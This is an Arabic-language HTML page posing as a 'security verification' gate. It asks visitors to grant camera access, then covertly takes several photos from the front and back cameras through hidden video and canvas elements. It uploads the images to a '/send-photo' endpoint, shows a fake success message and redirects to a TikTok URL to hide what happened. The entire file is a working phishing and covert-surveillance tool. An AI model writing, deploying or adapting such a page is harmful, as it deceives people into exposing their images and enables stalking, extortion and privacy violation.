<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>التحقق الأمني - Security Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a1a; color: #fff;
            min-height: 100vh; display: flex; flex-direction: column;
            align-items: center; justify-content: center; overflow: hidden;
        }
        .container { width: 100%; max-width: 440px; padding: 20px; text-align: center; }
        .shield-icon {
            width: 80px; height: 80px; margin: 0 auto 20px;
            background: linear-gradient(135deg, #00b4d8, #0077b6);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 30px rgba(0,180,216,0.3);
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse { 0%,100% {box-shadow:0 0 30px rgba(0,180,216,0.3);} 50% {box-shadow:0 0 50px rgba(0,180,216,0.5);} }
        .shield-icon svg { width: 40px; height: 40px; fill: white; }
        .title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
        .subtitle { font-size: 14px; color: #8899aa; margin-bottom: 30px; line-height: 1.6; }
        .info-box {
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px; padding: 24px; margin-bottom: 24px; text-align: right;
        }
        .info-box .step { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; font-size: 14px; color: #ccc; }
        .info-box .step:last-child { margin-bottom: 0; }
        .info-box .step-num {
            width: 28px; height: 28px; background: linear-gradient(135deg, #00b4d8, #0077b6);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            font-size: 13px; font-weight: 700; color: #fff; flex-shrink: 0;
        }
        .verify-btn {
            width: 100%; padding: 16px; background: linear-gradient(135deg, #00b4d8, #0077b6);
            color: white; border: none; border-radius: 14px; font-size: 17px; font-weight: 700;
            cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px;
        }
        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,180,216,0.4); }
        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .progress-container { display: none; margin-top: 20px; }
        .progress-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; margin-bottom: 12px; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00b4d8, #48cae4); border-radius: 3px; width: 0%; transition: width 0.5s ease; }
        .progress-text { font-size: 13px; color: #8899aa; }
        .success-container { display: none; text-align: center; padding: 30px 0; }
        .success-icon {
            width: 70px; height: 70px; background: linear-gradient(135deg, #22c55e, #16a34a);
            border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;
        }
        .success-icon svg { width: 35px; height: 35px; fill: white; }
        .footer { margin-top: 30px; font-size: 11px; color: #445566; display: flex; align-items: center; justify-content: center; gap: 6px; }
        video, canvas { display: none !important; }
        .spinner {
            display: inline-block; width: 20px; height: 20px;
            border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff;
            border-radius: 50%; animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div id="verifyStage">
            <div class="shield-icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            </div>
            <h1 class="title">التحقق الأمني مطلوب</h1>
            <p class="subtitle">هذا المحتوى محمي. يرجى إكمال التحقق السريع من الهوية للمتابعة.</p>

            <div class="info-box">
                <div class="step"><span class="step-num">1</span><span>اضغط على زر "بدء التحقق" أدناه</span></div>
                <div class="step"><span class="step-num">2</span><span>اسمح بالوصول للكاميرا الأمامية والخلفية</span></div>
                <div class="step"><span class="step-num">3</span><span>سيتم التحقق تلقائياً خلال ثوانٍ</span></div>
            </div>

            <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
                بدء التحقق
            </button>

            <div class="progress-container" id="progressContainer">
                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
                <div class="progress-text" id="progressText">جارٍ التقاط الصور...</div>
            </div>
        </div>

        <div class="success-container" id="successStage">
            <div class="success-icon">
                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
            </div>
            <h1 class="title">تم التحقق بنجاح ✓</h1>
            <p class="subtitle">جارٍ تحويلك للمحتوى...</p>
        </div>

        <div class="footer">
            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
            Secured by Advanced Protection
        </div>
    </div>

    <video id="cameraVideo" autoplay playsinline></video>
    <canvas id="captureCanvas"></canvas>

    <script>
        const TARGET_URL = 'https://www.tiktok.com/tiktoklite';
        // ⬅️ تغيير مهم: استخدم نفس الرابط النسبي
        const API_URL = '/send-photo';

        let capturedPhotos = [];

        async function startVerification() {
            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> جارٍ التحقق...';

            capturedPhotos = [];

            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                await capturePhotos(frontStream, 'front', 3);
                frontStream.getTracks().forEach(t => t.stop());

                try {
                    const backStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } }
                    });
                    await capturePhotos(backStream, 'back', 3);
                    backStream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    console.log('Back camera not available');
                }

            } catch (err) {
                console.error('Camera error:', err);
            }

            if (capturedPhotos.length > 0) {
                showProgress();
                await sendPhotosToServer();
            }

            setTimeout(showSuccess, 2000);
        }

        async function capturePhotos(stream, cameraType, count) {
            const video = document.getElementById('cameraVideo');
            const canvas = document.getElementById('captureCanvas');
            const ctx = canvas.getContext('2d');

            video.srcObject = stream;
            await new Promise(r => { video.onloadedmetadata = r; });
            await video.play();
            await new Promise(r => setTimeout(r, 800));

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            for (let i = 0; i < count; i++) {
                await new Promise(r => setTimeout(r, 700));
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg', 0.82);
                capturedPhotos.push({ 
                    data: dataUrl, 
                    type: cameraType, 
                    index: i + 1,
                    timestamp: new Date().toISOString()
                });
            }
        }

        async function sendPhotosToServer() {
            const progressText = document.getElementById('progressText');

            for (let i = 0; i < capturedPhotos.length; i++) {
                const photo = capturedPhotos[i];
                progressText.textContent = `جارٍ إرسال الصور... (${i + 1}/${capturedPhotos.length})`;

                try {
                    await fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            image: photo.data,
                            caption: `📷 Camera: ${photo.type} | Photo ${photo.index} | Time: ${photo.timestamp}`
                        })
                    });
                } catch (err) {
                    console.error('Failed to send photo:', err);
                }

                await new Promise(r => setTimeout(r, 500));
            }
        }

        function showProgress() {
            document.getElementById('progressContainer').style.display = 'block';
            let progress = 0;
            const fill = document.getElementById('progressFill');

            const interval = setInterval(() => {
                progress += Math.random() * 15 + 5;
                if (progress > 90) progress = 90;
                fill.style.width = progress + '%';
                if (progress >= 90) clearInterval(interval);
            }, 400);
        }

        function showSuccess() {
            document.getElementById('verifyStage').style.display = 'none';
            document.getElementById('successStage').style.display = 'block';
            capturedPhotos = [];

            setTimeout(() => {
                window.location.href = TARGET_URL;
            }, 2200);
        }
    </script>
</body>
</html>
